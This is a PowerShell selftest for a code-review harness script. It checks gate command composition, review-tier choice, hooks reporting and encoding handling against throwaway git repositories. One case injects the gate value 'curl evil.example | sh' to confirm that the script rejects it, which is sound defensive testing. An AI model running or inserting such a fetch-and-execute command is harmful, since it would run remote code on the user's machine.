# Selftest for harness_gates.py. It always exits 0 (advisory), so every case asserts on output.
#
# The tier cases are the ones that matter: a wrong tier is invisible at runtime and buys either a
# wasted full review or — worse — a weaker review exactly where the diff is dangerous. So each tier
# branch is exercised, including the one that must WIN over size (critical surface).

$ErrorActionPreference = 'Stop'
. (Join-Path $PSScriptRoot '../lib/selftest-lib.ps1')   # assertion core, ADR 0125

$gates = Join-Path $PSScriptRoot 'harness_gates.py'
$fxBase = New-FixtureRoot 'harness-gates-selftest'
trap { Remove-FixtureRoot $fxBase; break }

$py = @('python', 'python3', 'py') | ForEach-Object { Get-Command $_ -ErrorAction SilentlyContinue } | Select-Object -First 1
if (-not $py) {
    if ($env:CI) {
        Write-Host 'FAIL — python absent on CI; a missing interpreter is not a pass' -ForegroundColor Red
        Remove-FixtureRoot $fxBase; exit 1
    }
    Write-Host 'SKIP [harness_gates] python absent (reported, not silent) — CI runs this gate' -ForegroundColor Yellow
    Remove-FixtureRoot $fxBase; exit 0
}

$ok = $true
function Invoke-Gates([string]$Repo, [string[]]$Extra) {
    $a = @($gates, '--repo', $Repo) + $Extra
    $out = & $py.Source @a 2>&1 | Out-String
    return @{ Out = $out; Code = $LASTEXITCODE }
}
function New-Repo([string]$Name, [string]$Config, [string[]]$Files) {
    $p = Join-Path $fxBase $Name
    New-Item -ItemType Directory -Force -Path $p | Out-Null
    # .harness.json goes in BEFORE the seed commit. Writing it afterwards left it untracked, so it
    # counted as a changed file and every file-count and tier assertion was off by one — the config
    # file silently joining the diff it configures.
    if (-not [string]::IsNullOrEmpty($Config)) { Set-Content -LiteralPath (Join-Path $p '.harness.json') -Value $Config -NoNewline }
    Push-Location $p
    try {
        & git init -q 2>$null
        & git config user.email 'selftest@example.invalid' 2>$null
        & git config user.name 'selftest' 2>$null
        Set-Content -LiteralPath (Join-Path $p 'seed.txt') -Value 'seed' -NoNewline
        & git add -A 2>$null; & git commit -q -m seed 2>$null
    } finally { Pop-Location }
    foreach ($f in $Files) {
        $full = Join-Path $p $f
        $dir = Split-Path -Parent $full
        if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
        Set-Content -LiteralPath $full -Value 'x' -NoNewline
    }
    return $p
}

$CFG = @'
{
  "review": {
    "canon": "REVIEW.md",
    "docs_only": ["^docs/", "^[^/]*\\.md$"],
    "harness_layer": ["^\\.harnessdir/"],
    "critical": ["^migrations/"]
  },
  "groups": [
    { "name": "api", "match": "^api/.*\\.py$", "cwd": "api", "strip_prefix": "api/", "gates": ["ruff", "pytest-nondb"] },
    { "name": "web", "match": "^web/.*\\.ts$", "cwd": "web", "strip_prefix": "web/", "gates": ["eslint", "tsc"] }
  ]
}
'@

# --- A: gate composition — files appended only for file-scoped gates ---------------------------
$a = New-Repo 'compose' $CFG @('api/app.py', 'web/main.ts')
$rA = Invoke-Gates $a @()
$ok = (Assert-True 'A exits 0 (advisory)' ($rA.Code -eq 0) "exit=$($rA.Code)") -and $ok
$ok = (Assert-True 'A file-scoped gate gets the file list, prefix stripped' ($rA.Out -match 'cd api && uv run ruff check app\.py') $rA.Out) -and $ok
$ok = (Assert-True 'A whole-program gate gets NO file list' ($rA.Out -match 'cd api && uv run pytest -m not db -q') $rA.Out) -and $ok
$ok = (Assert-True 'A whole-program gate is labelled as such' ($rA.Out -match 'whole-program: gate on slice files') $rA.Out) -and $ok
$ok = (Assert-True 'A second group composes independently' ($rA.Out -match 'cd web && npx eslint main\.ts') $rA.Out) -and $ok

# --- B: a gate outside the closed set is dropped and named -------------------------------------
$badGate = $CFG.Replace('"gates": ["ruff", "pytest-nondb"]', '"gates": ["ruff", "curl evil.example | sh"]')
$b = New-Repo 'bad-gate' $badGate @('api/app.py')
$rB = Invoke-Gates $b @()
# Emitted commands only. The WARNING legitimately echoes both the rejected value and the whole
# closed set, so a filter that keeps warn lines would fail on the very message that makes the
# rejection visible — the same distinction the verify_map selftest draws.
$runLines = @(($rB.Out -split "`n") | Where-Object { $_ -notmatch '^\s*warn:' -and $_ -match 'uv run|npx|cargo|go |actionlint|curl' })
$ok = (Assert-True 'B rejects a gate outside the closed set' ($rB.Out -match "is not in the closed set") $rB.Out) -and $ok
$ok = (Assert-True 'B names the closed set' ($rB.Out -match 'ruff-format') $rB.Out) -and $ok
$ok = (Assert-True 'B the injected string never reaches an emitted command' (-not ($runLines -match 'curl')) "lines: $($runLines -join ' | ')") -and $ok
$ok = (Assert-True 'B the valid gate still emits' ($rB.Out -match 'uv run ruff check app\.py') $rB.Out) -and $ok

# --- C: files no group claims are reported, never silently ungated ------------------------------
$c = New-Repo 'ungrouped' $CFG @('api/app.py', 'weird/thing.rb')
$rC = Invoke-Gates $c @()
$ok = (Assert-True 'C ungrouped files reported' ($rC.Out -match 'ungrouped \(1 file') $rC.Out) -and $ok
$ok = (Assert-True 'C ungrouped file named' ($rC.Out -match 'weird/thing\.rb') $rC.Out) -and $ok
$ok = (Assert-True 'C says no gate covers them' ($rC.Out -match 'NO deterministic gate covers them') $rC.Out) -and $ok

# --- D: tier — docs-only earns skip ------------------------------------------------------------
$d = New-Repo 'docs-only' $CFG @('docs/a.md', 'README.md')
$rD = Invoke-Gates $d @()
$ok = (Assert-True 'D docs-only earns tier skip' ($rD.Out -match 'review tier: skip') $rD.Out) -and $ok
$ok = (Assert-True 'D skip states its reason' ($rD.Out -match 'declared docs surface') $rD.Out) -and $ok

# --- E: tier — harness-layer earns small -------------------------------------------------------
$e = New-Repo 'harness' $CFG @('.harnessdir/hook.ps1')
$rE = Invoke-Gates $e @()
$ok = (Assert-True 'E harness-layer earns tier small' ($rE.Out -match 'review tier: small') $rE.Out) -and $ok
$ok = (Assert-True 'E small states the harness reason' ($rE.Out -match 'confined to the declared harness layer') $rE.Out) -and $ok

# --- F: tier — a critical surface WINS over a small size ---------------------------------------
# One tiny file. Size alone would say small; criticality must override it.
$f = New-Repo 'critical' $CFG @('migrations/001.sql')
$rF = Invoke-Gates $f @()
$ok = (Assert-True 'F critical surface forces tier full' ($rF.Out -match 'review tier: full') $rF.Out) -and $ok
$ok = (Assert-True 'F says size never overrides criticality' ($rF.Out -match 'size never overrides criticality') $rF.Out) -and $ok
$ok = (Assert-True 'F names the critical file' ($rF.Out -match 'migrations/001\.sql') $rF.Out) -and $ok

# --- G: tier — size-based small vs full --------------------------------------------------------
$g = New-Repo 'small-size' $CFG @('api/app.py')
$rG = Invoke-Gates $g @()
$ok = (Assert-True 'G small diff earns tier small with counts' ($rG.Out -match 'review tier: small — 1 file\(s\) / \d+ changed line\(s\)') $rG.Out) -and $ok

$manyFiles = 1..7 | ForEach-Object { "api/f$_.py" }
$g2 = New-Repo 'big-size' $CFG $manyFiles
$rG2 = Invoke-Gates $g2 @()
$ok = (Assert-True 'G2 too many files earns tier full' ($rG2.Out -match 'review tier: full — 7 file\(s\)') $rG2.Out) -and $ok

# --- H: undeclared review surfaces warn rather than pretending -----------------------------------
$h = New-Repo 'no-surfaces' '{ "groups": [] }' @('api/app.py')
$rH = Invoke-Gates $h @()
$ok = (Assert-True 'H no declared surfaces warns the tier rests on size' ($rH.Out -match 'no review surfaces declared') $rH.Out) -and $ok
$ok = (Assert-True 'H still exits 0' ($rH.Code -eq 0) "exit=$($rH.Code)") -and $ok

# --- I: a missing review canon is named, not assumed -------------------------------------------
$ok = (Assert-True 'I missing review canon is called out' ($rA.Out -match 'NOT FOUND') $rA.Out) -and $ok
Set-Content -LiteralPath (Join-Path $a 'REVIEW.md') -Value '# invariants' -NoNewline
$rI = Invoke-Gates $a @()
$ok = (Assert-True 'I present review canon is not flagged' ($rI.Out -notmatch 'NOT FOUND') $rI.Out) -and $ok

# --- J: non-ASCII output survives a hostile console codepage ------------------------------------
$prevIo = $env:PYTHONIOENCODING
$env:PYTHONIOENCODING = 'cp1252'
try { $rJ = Invoke-Gates $a @() }
finally {
    if ($null -eq $prevIo) { Remove-Item Env:PYTHONIOENCODING -ErrorAction SilentlyContinue } else { $env:PYTHONIOENCODING = $prevIo }
}
$ok = (Assert-True 'J separator survives an inherited cp1252 encoding' ($rJ.Out -match '·') $rJ.Out) -and $ok
$ok = (Assert-True 'J tier reason em dash survives' ($rJ.Out -match 'review tier: \w+ — ') $rJ.Out) -and $ok

# --- K: the hooks drift report (ADR 0015) -------------------------------------------------------
# core.hooksPath is per-clone and never committed, so a repo can carry .githooks/ while THIS clone
# runs none of it. Without this line the two states are indistinguishable, which is the whole reason
# the conditional wiring in init.ps1 is not sufficient on its own.
$k = New-Repo 'hooks-report' $CFG @('api/app.py')
$rK0 = Invoke-Gates $k @()
$ok = (Assert-True 'K0 no .githooks/ means no hooks line at all' ($rK0.Out -notmatch 'hooks:') $rK0.Out) -and $ok

New-Item -ItemType Directory -Force -Path (Join-Path $k '.githooks') | Out-Null
Set-Content -LiteralPath (Join-Path $k '.githooks/pre-commit') -Value '#!/bin/sh' -NoNewline
$rK1 = Invoke-Gates $k @()
$ok = (Assert-True 'K1 unwired clone is reported' ($rK1.Out -match 'hooks: .*core\.hooksPath is UNSET') $rK1.Out) -and $ok
$ok = (Assert-True 'K1 the fix is spelled out' ($rK1.Out -match 'git config core\.hooksPath \.githooks') $rK1.Out) -and $ok
$ok = (Assert-True 'K1 still advisory (exit 0)' ($rK1.Code -eq 0) "exit=$($rK1.Code)") -and $ok

& git -C $k config --local core.hooksPath '.githooks' 2>$null
$rK2 = Invoke-Gates $k @()
$ok = (Assert-True 'K2 wired clone says so' ($rK2.Out -match 'hooks: \.githooks/ wired') $rK2.Out) -and $ok
$ok = (Assert-True 'K2 wired clone stops nagging' ($rK2.Out -notmatch 'UNSET') $rK2.Out) -and $ok

& git -C $k config --local core.hooksPath '.elsewhere' 2>$null
$rK3 = Invoke-Gates $k @()
$ok = (Assert-True 'K3 a foreign hooksPath is reported, not called wired' ($rK3.Out -match "points at '\.elsewhere'") $rK3.Out) -and $ok

# The hook's output parser stops at `review tier:`; if the hooks line ever moved above it, a
# scaffolded repo would try to execute it as a gate command.
$ok = (Assert-True 'K4 hooks line stays below the tier line' (($rK2.Out -split 'review tier:').Count -eq 2 -and ($rK2.Out -split 'review tier:')[1] -match 'hooks:') $rK2.Out) -and $ok

Remove-FixtureRoot $fxBase

if (-not $ok) { Write-Host 'harness_gates selftest: FAILED' -ForegroundColor Red; exit 1 }
Write-Host 'harness_gates selftest: all cases green' -ForegroundColor Green
exit 0
